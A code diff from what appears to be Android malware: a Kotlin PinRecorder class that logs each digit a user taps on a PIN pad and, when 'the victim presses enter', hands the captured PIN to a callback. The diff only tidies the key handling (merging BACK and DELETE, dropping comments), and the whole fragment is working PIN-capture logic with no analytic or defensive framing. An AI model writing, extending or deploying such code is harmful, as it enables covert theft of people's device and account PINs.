@@ -34,30 +34,21 @@ class PinRecorder(val callback: (String) -> Unit) {
 
     fun appendPinDigit(digit: String) {
         when (digit) {
-            PinPad.DELETE -> {
-                // Remove the last digit logged if the user pressed delete.
+            PinPad.BACK, PinPad.DELETE -> {
                 digitQueue.poll()
             }
-
-            PinPad.BACK -> {
-                digitQueue.poll()
-            }
-
             PinPad.ENTER -> {
                 // When the victim presses enter, get ready for a new one.
                 callback(digitQueue.joinToString("-"))
                 clearPinQueue()
             }
-
             PinPad.EMERGENCY -> {
                 // Ignore these
             }
-
             else -> {
                 // Otherwise, add the digit to the digitQueue.
                 digitQueue.add(digit)
             }
-
         }
     }
 
